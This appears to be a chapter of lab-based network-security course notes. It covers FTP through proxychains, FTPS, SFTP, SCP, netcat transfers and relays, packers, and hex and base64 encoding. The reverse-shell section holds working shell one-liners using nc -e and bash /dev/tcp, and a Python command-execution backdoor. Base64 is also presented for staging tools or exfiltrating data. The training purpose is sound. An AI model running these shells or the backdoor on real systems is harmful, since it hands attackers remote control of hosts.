From blue-internet-host we connect to bob-host to create a Dynamic tunnel so we can use the proxychains tool.
From blue-internet-host we use proxychains ftp 10.0.0.104 to connect to james-host at 10.0.0.104 via our proxy bob-host.
We authenticate with either anonymous, james, or any other account on the system.
Using anonymous we will be able to see the contents of the ftp-root folder.
Using james we will be able to see any files in james's home drive.
Since we are connecting to james-host through bob-host as our proxy, james-host will not be able to connect back to our blue-internet-host to establish a data channel.
We will use the passive command to manually switch to passive mode.
This will enable the blue-internet-host to create any data channels to download files using the get command.

student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 17:20:09 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,162,147).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:41619-<><>-OK
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>

student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command
ftp: bind: Address already in use
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,168,167).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:43175-<><>-OK
150 Opening ASCII mode data connection for file list

{any files that are in James's home drive}

226 Transfer complete
ftp>


Resources


Instructor Note


7.1.3 FTPS¶
File Transfer Protocol Secure is an extension of the FTP protocol and adds support for TLS and formerly, SSL protocols.

Identified in RFC 2228 published in October 1997 and specified in RFC 4217 published in October 2005.
should NOT be confused with traditional FTP tunneled over SSH or SFTP, FTPS is a completely separate protocol.
uses SSL/TLS for encryption
FTPS supports various authentication methods, including username/password authentication and client certificates. This allows clients and servers to verify each other's identities before establishing a secure connection.
Has interactive terminal access
Still requires multiple open ports for multiple connections

Operating Modes:

Explicit FTPS: In this mode, the client connects to the server's control port (usually port 21) initially, and then negotiates the use of TLS/SSL encryption before proceeding with file transfers.

In explicit mode, the client connects to the server's control port (usually port 21) initially, just like in traditional FTP.
The client then issues a command (usually the AUTH command) to request a secure connection using TLS/SSL encryption.
After receiving the client's request, the server negotiates the use of TLS/SSL encryption for the control channel.
Once the secure control connection is established, the client and server can negotiate the use of TLS/SSL encryption for the data channel as needed.
Explicit FTPS provides more flexibility and control over the secure connection setup, allowing clients and servers to negotiate encryption parameters and authentication methods.
However, explicit mode requires additional steps to initiate the secure connection, which may require more configuration and management compared to implicit mode.
Implicit FTPS: Implicit mode assumes encryption at all times and uses TCP port 990 for control and TCP port 989 for data with encryption happening on both channels.

In implicit mode, the entire session is encrypted from the outset.
The client connects to a dedicated secure port on the server (usually port 990) without explicitly negotiating the use of TLS/SSL encryption.
The server expects the client to initiate the connection using TLS/SSL immediately upon connecting to the secure port.
All communication between the client and server, including both control and data channels, is encrypted by default.
Implicit FTPS is considered easier to configure and use because the secure connection is established automatically when the client connects to the designated secure port.
However, implicit mode is less common than explicit mode and may not be supported by all FTPS servers.


Resources


Instructor Note


7.1.4 SFTP¶
SSH File Transfer Protocol is a network protocol that provides file access, transfer, and management over any reliable data stream. Created by the IETF as an extension of SSH v2.0. It is its own unique protocol and is NOT an extension of FTP. Its advantage over SCP is that it has a higher range of features, such as resuming interrupted transfers, directory listings, and remote file removal. SCP is simpler and faster, however.

published in:

RFC 4251
RFC 4253
RFC 4254
should NOT be confused with traditional FTP tunneled over SSH.

also should NOT be confused with Simple File Transfer Protocol
uses TCP port 22
secure - uses symmetric and assymetric encryption
authentication through username/password or via SSH key
has interactive terminal access
FTP over SSH

FTP over SSH is not SFTP; it is simply tunneling a normal FTP session over an SSH connection.
The only channel to be encrypted in SSH is the initial control channel. The data channel is an entirely new network connection, established by the server, which does not afford any confidentiality or integrity for the data.

This will be explored in the SSH activities later and will become more apparent after the SSH discussion. For now, secure alternatives such as SCP and SSH File Transfer Protocol will be emphasized.

This can still be accomplished in the method described here:

FTP over SSH


Resources


Instructor Note


7.1.5 SCP¶
Secure Copy Protocol uses the same authentication and encryption mechanisms as SSH and therefore offers confidentiality, integrity, and authentication. It allows the transfer of files from a local to remote host, a remote to local host, or from two remote hosts using your host as an intermediary.

TCP Transport (TCP port 22)
Uses symmetric and asymmetric encryption
Authentication through sign in (username and password) or with SSH key
Non-Interactive


Resources


Instructor Note


7.1.5.1 Benefits of SCP¶
SCP (Secure Copy Protocol) stands out for its robust security features, utilizing SSH for encryption, authentication, and data integrity verification during file transfers, ensuring that sensitive data remains protected from unauthorized access and tampering. Its platform independence, ease of use, and efficiency make it a popular choice for securely transferring files between systems, while its compatibility with various SSH implementations and automatability further enhance its versatility for a wide range of use cases, from system administration tasks to automated backup solutions.

It's encrypted.
It only uses a single port.
Authenticity is provided as well through the fingerprint.
Upon first login to a new device, the user will be prompted to verify the fingerprint information.
Additionally, if the fingerprint information changes, the user will be provided an error and be instructed to removed the old fingerprint information only if the changes were indeed intentional.
This can be helpful to identify traffic redirection or man-in-the-middle attempts.
Use the following switches in conjunction with the syntax below to display more information:


-v - verbose mode
-p - provides estimated time and connection speed
-P - port - Specifies the port to connect to on the remote host. Note that this option is written with a capital `P`.
-C - enable compression
-l - limit bandwidth (counted in bits, ex: 100KB/s (100*8), specify the parameter as 800)
-r - recursively copy an entire directory
-3 - copies between two remote hosts are transferred through the localhost.  Without this option the data is copied directly between the two remote hosts.  Note that this option disables the progress meter.


Resources


Instructor Note


7.1.5.2 Demonstration of SCP¶
SCP is used to copy file to/from remote systems. In doing so you have the following 3 options:

Copy from remote system to your local system.
Copy from your local system to a remote system.
Copy from remote system to another remote system.
Demonstration of file transfer from a remote host to a local host
Demonstration of file transfer from a local host to a remote host
Demonstration of 3rd party file transfer from a remote host to another remote host
Demonstration of file transfer from a remote host using an alternate ssh port to a local host
Demonstration of file transfer from a local host to a remote host using an alternate ssh port
Demonstration of file transfer from a remote host to a local host using a tunnel
Demonstration of file transfer from local host to a remote host using proxchains


Resources


Instructor Note


7.2 Conduct Uncommon Methods of File Transfer¶
There are times where you need to copy a file but might not have access to a typically file transfer tool like we discussed. Sometimes we have to use other tools to help transfer these files. Some tools we will discuss are:

Netcat
/dev/tcp


Resources


Instructor Note


7.2.1 Netcat¶
Netcat is a program that establishes connections between two computers and allows data to be written via TCP and UDP transport protocols. Its naming convention is likely a derivative of the cat command, but netcat has networking capabilities thrown in. Netcat is often referred to as the "Swiss Army knife for TCP/IP communications." It is simple and flexible and can be leveraged by attackers. Netcat can be used for the following:

file transfers
banner grabbing
port scanning
as a chat server
TCP is the protocol that allows both client and server the ability to send or receive respectively. The distinction is not in the sending and receiving, but in the way in which the connection is created.

Server Socket - creates a bind to a port and listens for a connection from a client.
nc -lvp 1111
Client Socket - creates a connection to a listening server socket.
nc 10.10.0.40 1111


Resources


Instructor Note


7.2.1.1 Netcat operates in two primary modes:¶
Listener (server socket) - netcat listens for a connections inbound from another computer. A listener must always be established before a client can make a connection.

This example uses -l to establish a listener and -p to specify a listening port; both are required for the listener to function. If you do not specify the -p, the system will listen on a random ephemeral port. Additionally you can add -v for verbosity.


$ nc -l -v -p 1111
Client - netcat initiates connections to another computer

The below example uses nc to attempt a connection to a device with an IP address of 10.10.0.40 on port 1111.


$ nc 10.10.0.40 1111


Resources


Instructor Note


7.2.1.2 Demonstration - Netcat chat server¶
Enter the following syntax on Blue_Host-1 (172.16.82.106) in openstack to establish a listener on port 9001:

$ nc -lvp 9001
From your Internet_Host, enter the following to create a client connection to the port previously opened on the internet host:

$ nc 172.16.82.106 9001
From BH1 type: "message from client from listener" on BH1

Switch to IH and type "message from client to listener"



Resources


Instructor Note


7.2.1.3 Demonstration - Transferring files in Netcat¶
NETCAT: CLIENT TO LISTENER FILE TRANSFER:
Note: the listener should always be established first. Client connection attempts will fail if the listener has not been established to receive the connection.

Create a file on IH to be transferred containing credentials:


$ echo "User Name - SecretSquirrel\nPassword - S3cr3tStuff" > file.txt
On BH1, create a Netcat listener using -l, v to listen verbosely, and p to specify the listening port 9001.

Direct the STD OUT of the netcat connection as STD IN to the newfile.txt.
This will prepare the listener to save any data received on port 9001 to the file automatically:


$ nc -lvp 9001 > newfile.txt
On IH, create a Netcat client to connect to BH1 on TCP port 9001.

Direct the STD OUT of the file.txt as STD IN to the netcat connection.
This will send the contents of the file to BH1 on port 9001:

$ nc 172.16.82.106 9001 < file.txt
NETCAT: LISTENER TO CLIENT FILE TRANSFER:
Note: the listener should always be established first. Client connection attempts will fail if the listener has not been established to receive the connection._

Create a file on BH1 to be transferred containing credentials:


$ echo "User Name - MoroccoMole\nPassword - S3cr3tB00B00" > file.txt
On BH1, create a Netcat listener using -l, v to listen verbosely, and p to specify the listening port 9001.
Direct the STD OUT of the file.txt as STD IN to the netcat connection.
This will prepare the listener to send the contents of the file to anyone that connects to port 9001 automatically:

$ nc -lvp 9001 < file.txt
On IH, create a Netcat client to connect to BH1 on TCP port 9001.
Direct the STD OUT of the netcat connection as STD IN to the newfile.txt.
This will save any data received on port 9001 to the file automatically:

$ nc 172.16.82.106 9001 > newfile.txt


Resources


Instructor Note


7.2.2 Traffic redirection using netcat relays¶
A basic netcat connection is bi-directional meaning that communication can flow freely to and from the two connected devices. The bi-directional flow is broken when a third device is added as a relay. To resolve this issue, named pipes (mkfifo or mknod p) must be used to extend that bi-directional functionality and pass information through a relay.



Resources


Instructor Note


7.2.2.1 Unnamed Pipes¶
Normally, unnamed pipes are used for inter-process communication. However, a major disadvantage is that they can only be used by one process at a time or processes that share the same file descriptor table (child processes). Therefore, unnamed pipes have the limitation that they cannot pass information between unrelated processes.

Using an unnamed Pipe:

Execute the command netstat -antl | grep :22
The STD OUT of this command will be supplied as STD IN to the grep command.
From the STD IN, grep will look for the pattern :22 and output any matches to the screen.


$ netstat -antl | grep :22


Resources


Instructor Note


7.2.2.2 Named Pipes¶
Named pipes (aka FIFO pipes), exist as special files within a file system (file type p) and are created with a filename to identify them.
Named pipes allow the sharing of data between unrelated processes.
Additionally, they exist until they are removed and can be used with whatever process desired, not just descendants of the pipe creator.
Listed below are a few advantages of FIFO (First In First Out) pipes:

It implements FIFO feature of the pipes - data will be directed out of the file in the order in which it was received
They can be opened and referenced just like normal files using their names.
Data can be continuously read from, or written to the fifo
Making a Named Pipe:


$ mknod pipe p
-or-


$ mkfifo pipe


Resources


Instructor Note


7.2.2.3 File Descriptors¶
Recall the three types of standard channels for communication streams:

Name	File Descriptor	Description	Abbreviation
Standard input	0	The default data stream for input. ex: terminal defaults to keyboard input from the user	stdin
Standard output	1	The default data stream for output. ex: terminal defaults output to the users screen	stdout
Standard error	2	The default data stream for output that relates to errors ex: terminal defaults to the users screen or ignored and sent to /dev/null	stderr


Resources


Instructor Note


7.2.2.4 Demonstration - Netcat Relays¶
First, create a named pipe file called "mypipe" on BLUE_HOST-1:

mknod mypipe -p
-or-


mkfifo mypipe


Resources


Instructor Note


7.2.2.4.1 Listener to Listener Relay¶
Two internal devices cannot connect to each other but can both connect to an internal or external device that can serve as a relay.



Internet_Host: LISTENER (Sending)


nc 172.16.82.106 1111 < secret.txt
Blue_Host-1: RELAY


nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
Blue_Priv_Host-1: LISTENER (Receiving)


nc 192.168.1.1 3333 > newsecret.txt


Resources


Instructor Note


7.2.2.4.2 Client to Client Relay¶
An internal device can connect directly to the attacker (you) and target devices, but those devices do not have direct connectivity to each other. This configuration is commonly used in attacks to impersonate an internal device.



Internet_Host: CLIENT (Sending)


nc -lvp 1111 < secret.txt
Blue_Host-1: RELAY


nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
Blue_Priv_Host-1: CLIENT (Receiving)


nc -lvp 3333 > newsecret.txt


Resources


Instructor Note


7.2.2.4.3 Client to Listener Relay¶
A combination of client and listener may be used when filtering is in place to prevent connection attempts on either end of the relay.



Internet_Host: CLIENT (Sending)


nc -lvp 1111 < secret.txt
Blue_Host-1: RELAY


nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
Blue_Priv_Host-1: LISTENER (Receiving)


nc 192.168.1.1 3333 > newsecret.txt


Resources


Instructor Note


7.2.2.4.4 Listener to Client Relay¶
A combination of client and listener may be used when filtering is in place to prevent connection attempts on either end of the relay.



Internet_Host: LISTENER (Sending)


nc 172.16.82.106 1111 < secret.txt
Blue_Host-1: RELAY


nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
Blue_Priv_Host-1: CLIENT (Receiving)


nc -lvp 3333 > newsecret.txt


Resources


Instructor Note


7.2.3 File transfer with /DEV/TCP¶
/dev/tcp is the system file that interacts directly with the TCP protocol. In some cases, a machine might not have nc installed natively. Since /dev/tcp in one of several device files that support the bash shell, this option may allow you to "live off the land." It can be used by bash to interact directly with the TCP stack. We can use /dev/tcp to create a socket connection to a specific website, internal device, or external device. Similar functionality is also available with /dev/udp.

When a process accesses /dev/tcp/host/port, the shell creates a TCP connection to the specified host and port.

Establish a Netcat listener on the Internet Host. The syntax below uses -l to establish the listener, v to listen verbosely, and p to specify port 1111.


$ nc -lvp 1111 > devtcpfile.txt
On the sending system use /dev/tcp to send the file by using the cat command.


cat secret.txt > /dev/tcp/10.10.0.40/1111


Resources


Instructor Note


7.3 Reverse shells¶
A reverse shell is a type of shell where the target machine initiates the connection to the attacker's machine. This can be useful for gaining and maintaining remote access to a system using native tools.



Resources


Instructor Note


7.3.1 Using Netcat¶
Now that socket communication and netcat relays are understood, put it all together let's discuss uses beyond file transfer.

Netcat has an option -e that allows for the execution of a program on a host. This can be used for creating a shell on a forward compromised host.

In this scenario, we want to obtain shell access to the victim machine. We can use a compromised host to pivot this connection across the network to the attacking host that is listening for the connection. In this scenario we will use a client-listener relay.

First, establish the listener on the attack machine; in this case the Internet Host. The syntax below uses -l to establish the listener, -v to listen verbosely, and -p to specify port 9999.

$ nc -lvp 9999
Now establish the client connection from the victim machine (in this example, the victim machine is BH1) using the -e command to pass shell access.

The below command creates the final connection to BH1 at IP 172.16.82.106 on port 9999 (passing through the relay and on to the IH).
The -e switch is used to pass the bash shell or to run a script.
The -c switch can also be used to pass bash commands.
Depending on linux OS, some netcat installations may not have one or either of these options available.


$ nc -c /bin/bash 10.10.0.40 9999
-or-

$ nc -e /bin/bash 10.10.0.40 9999
Last, we can now return to the listener established on the IH and run commands from the attack machine that will be executed on the victim.


$ pwd
$ whoami
$ hostname
$ ip a


Resources


Instructor Note


7.3.2 Using /DEV/TCP¶
First, establish the listener on the attack machine; in this case the Internet Host. The syntax below uses -l to establish the listener, v to listen verbosely, and p to specify port 9999.

$ nc -lvp 9999
Passing an interactive bash shell from Blue_Host-1:


/bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
/bin/bash - This specifies the path to the Bash shell executable.

-i - This option tells Bash to launch in interactive mode. When Bash is run interactively, it reads commands from the terminal and provides features such as command history, command editing, and tab completion. Interactive mode is useful for tasks where direct user input and interaction are required.

/dev/tcp/10.10.0.40/9999 - Invokes access to the TCP protocol stack to create a TCP connection to 10.10.0.40 on port 9999.

0<&1 - This part of the command redirects file descriptor 0 (standard input) to file descriptor 1 (standard output). This takes the file descriptor 1 (standard output) from the socket and direct it into file descriptor 0 (standard input) of the local system. This will allow the remote system to send commands from the socket and be interpreted by the local system.

2>&1 - This part of the command redirects file descriptor 2 (standard error) to file descriptor 1 (standard output). It tells the shell to direct standard error (file descriptor 2) from the local system into standard output (file descriptor 1). This will forward errors into the socket to be sent to the remotely connected system.



Resources


Instructor Note


7.3.3 Using Python3¶
Create your file:

nano backdoor.py
Copy and paste the code below:

backdoor.py

#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()
Set the file to be executable:


chmod +x backdoor.py 
Run the program:


./backdoor.py 
Use netcat to connect to the listening port:


nc 10.10.0.40 1234
Now you can send commands and view the results.



Resources


Instructor Note


7.4 Understanding packing and encoding¶
"Packing" and "encoding" are two concepts commonly used in computer science and data processing, especially when dealing with binary data or data transmission over networks.

Packing involves organizing data into a structured format suitable for storage or transmission. This typically involves converting data values (such as numbers or characters) into a binary representation and arranging them in a specific order according to predefined rules or specifications.

Encoding refers to the process of converting data from one representation to another, often for purposes such as compression, encryption, or ensuring compatibility between systems.



Resources


Instructor Note


7.4.1 Packers¶
Packers refer to tools or programs that are used to encrypt and/or compress executables and eliminate the need for a separate program to execute this function. Packers are designed to modify the format of an executable file while preserving its functionality. There are many uses for packers such as:

Compression: Packers often compress executable files, reducing their size and making them more compact. This can be useful for software distribution, as smaller files can be downloaded more quickly.

Obfuscation: Packers can obfuscate the code within an executable, making it more challenging for analysts or reverse engineers to understand the inner workings of the program. This can be a defensive measure against reverse engineering and unauthorized access.

Anti-Analysis Techniques: Some packers incorporate anti-analysis techniques to detect if the executable is being run within a virtual environment or a debugger. If such conditions are detected, the packed executable may behave differently or refuse to execute.

Code Encryption: Packers can encrypt portions of the executable's code, requiring the packer itself to decrypt and execute the code dynamically during runtime. This adds an extra layer of complexity to the analysis process.

Runtime Decompression: Packed executables typically include a decompression routine that runs before the actual program starts. This routine unpacks the compressed code and data, allowing the program to execute as intended.

Stealth and Evasion: Malware authors often use packers to make their malicious code less detectable by antivirus or intrusion detection systems. The altered code signature and behavior can help malware evade traditional security measures.

Packer tools play a valid role in software distribution and safeguarding, yet they are frequently exploited by malicious actors to conceal the actual nature of their harmful code. Consequently, security researchers and antivirus programs frequently flag packed executables as potentially suspicious or malicious due to the obfuscation and anti-analysis methods employed.

Security experts and researchers employ diverse tools and methodologies to scrutinize packed executables, gain insights into their functionalities, and pinpoint potential risks. Moreover, the analysis of packers becomes imperative in the examination of malware campaigns, shedding light on the strategies employed by threat actors to elude detection.

Some Types of Packers:

Executable Packers:

Purpose: These packers are designed to compress and encrypt standalone executable files (e.g., .exe files).
Use Case: Software developers often use executable packers to reduce the size of their applications for distribution. However, malware authors may also use them to obfuscate malicious code.
Binary Packers:

Purpose: Binary packers operate at the binary level, modifying the binary representation of the executable file.
Use Case: Used for both legitimate software distribution and malware obfuscation. The packed binary may have a different structure from the original.
Runtime Packers:

Purpose: These packers perform compression and encryption of executable code dynamically during runtime, just before the program is executed.
Use Case: Often employed by malware to evade static analysis, as the packed code is only visible in its unpacked form during execution.
Self-Extracting Packers:

Purpose: These packers create self-extracting archives that can unpack and execute the original executable when run.
Use Case: Used for software distribution, allowing users to extract and run an application without needing a separate unpacking tool.
Web Packers (JavaScript Packers):

Purpose: Web packers are used to compress and obfuscate JavaScript code in web applications to reduce load times and make it more challenging to reverse engineer.
Use Case: Commonly used by web developers to optimize the delivery of JavaScript code on websites.
Crypters:

Purpose: Crypters are a type of packer specifically designed to encrypt and obfuscate malware, making it more difficult for antivirus programs to detect.
Use Case: Widely used by malware authors to create polymorphic malware that can change its appearance with each execution.
PolyPackers (Polymorphic Packers):

Purpose: Polymorphic packers change their own code each time they are used, making it more challenging for security tools to create signatures for detection.
Use Case: Primarily used by malware to create polymorphic variants that can avoid signature-based detection.
UPX (Ultimate Packer for eXecutables):

Purpose: UPX is a popular open-source executable packer that compresses and decompresses executable files.
Use Case: Legitimately used by software developers to reduce file sizes, but also known to be used by malware authors.

UPX syntax:


upx.exe -o <output file> -<0-9> <input file>
The -<0-9> refers to compression. 0 being no compression and 9 being max compression. The higher the compression, the smaller the file, but the longer it will take to compress.



Resources


Instructor Note


7.4.2 Encoding and decoding:¶
Encoding is the application of specialized formatting to a data set; decoding is just the removal of that formatting to convert the data set back to its original format. These functions are commonly use in the transmission and storage of data. Historically, encoding and decoding was used in email to transmit binary data to systems that normally process text. Sending strickly binary data is not ideal due to the use of null characters, which had often indicated the end of a sequence or transmission. uuencode/uudecode and more commonly, base64 can be use to send and store binary data as text. +

Keep in mind that encoding is NOT compression; instead it requires additional space. It is useful for storing webpage images and audio files to reduce network requests and can also be used for data obsfucation. Additionally, encoding is NOT encryption; the data format is changed but can still be intercepted and easily decoded.

Encoding is a valuable technique for offensively or defensively. It works by obfuscating payloads or code, making them more resistant to detection by external entities. It serves as a protective layer, obscuring the true nature of the data or instructions being transmitted or stored. By employing encoding, sensitive information can be concealed from prying eyes, thwarting potential attackers' (or Network analysts) attempts to decipher or intercept it.



Resources


Instructor Note


7.4.2.1 Perform Hexadecimal endcoding and decoding¶
Hexadecimal encoding converts each byte to the 2-digit base-16 equivalent (preserving leading zeroes). It is inefficient, but it is a simple, commonly-used way to represent binary data in plain text. Four bits displayed as a single character; often used in representing MAC and IP addresses as well as notations for color schemes and other 32 and 64 bit values.

Programmers use Hex encoding to improve readability of bytes while increasing information density. Think of density as the amount of information on a single piece of paper, not in terms of storage space. In terms of storage space, it is rather inefficient, especially when spaces are added to easy readability. If there are concerns with storage space, Base64 may be a better alternative.

Demonstration - Hex encoding and decoding using xxd:

the xxd linux command creates a hex dump of a given file or input. It can also convert a hex dump back to its original binary form.

echo a string of text and use xxd to convert it to a plain hex dump with the -p switch:


$ echo "Hex encoding test" | xxd -p
48657820656e636f64696e6720746573740a
echo hex string and use xxd and the appropriate switches to restore the data to its original format. Use the -r switch to specify "revert to original data" along with the -p switch to specify the input as plain hex dump.


$ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
Hex encoding test


Resources


Instructor Note


7.4.2.2 Perform BASE64 encoding and decoding¶
Base64 is a method to represent binary data in ASCII format then to a radix-64 format.

Base64 is a group of binary-to-text encoding schemes that represent binary data (sequences of 8 bit bytes) in an ASCII string format by translating the data into a radix-64 representation.

The term Base64 originates from a specific MIM content transfer encoding.
each non-final Base64 digit represents exactly 6 bits of data.
three 8 bit bytes (a total of 24 bits) can therefore be represented by four 6 bit Base64 digits.
To ensure standardization and proper conversion, padding is used to fill in any unused Base64 digits and complete the 24 bit grouping.
Base64 is designed to carry all data stored in binary formats across channels that only reliably support text content.
Base64 is especially prevalent on the WWW and allows the ability to embed images and files in textual assets like HTML and CSS files.
Base64 is also widely used for sending e-mail attachments. This originated from the requirement of SMTP being designed to transport 7-bit ASCII characters.
Base64 encoding results in a 33-36% overhead (3% variance due to inserted line breaks)
To encode with base64 the binary bit-stream is divided into 6-bit groupings and each grouping in converted to its corresponding printable character as shown in Figure 2. If the original bit stream is not evenly divisible by 6 the = character is used for padding. To decode with base64 the binary bit-stream is divided back into 8-bit groupings restoring any non-printable bytes.

Figure 1: Base64 Conversion Chart

The chart below depicts the 6 bit character set used in Base64.


Figure 2: Base64 Conversion Chart

The chart below shows the conversion of traditional 8 bit ASCII text to 6 bit Base64 and the use of padding to complete the 6-byte grouping.

The word "Test" is first converted to its 8-bit equivalent.
The result is then broken into 6-bit groupings and converted to base64 using the below chart.
Padding is then used to fill in any remaining values to complete the 2nd 24-bit grouping.


Base64 encoding and decoding:

The base64 linux command can be used to encode and decode a file or standard input using the base64 system.

Base64 syntax to encode a file:


$ base64 myfile.txt
Base64 syntax to encode a string text:


$ echo "the contents of my file" | base64

dGhlIGNvbnRlbnRzIG9mIG15IGZpbGUK
To encode a file and redirect the output to a file:


$ base64 myfile.txt > encoded_file.txt
To decode a file:


$ base64 -d encoded_file.txt
To decode a string of base64:


$ echo "dGhlIGNvbnRlbnRzIG9mIG15IGZpbGUK" | base64 -d

the contents of my file


Resources


Instructor Note


7.4.2.3 Conducting file transfers with BASE64¶
At its most basic level, a file is still just a series of 1's and 0's. After converting, the code can be copied and reconstructed on our machine, leaving fewer host and network artifacts. This can be useful when staging tools or exfiltrating data.

Demonstration - File transfers with Base64

From our target machine, convert the file to base64, using -w0 to remove line wrapping:

$ base64 -w0 logoCyber.png
Highlight and copy the entire base64 output displayed on the victim machine. This can be lengthy, depending on file size. Our output is as follows:

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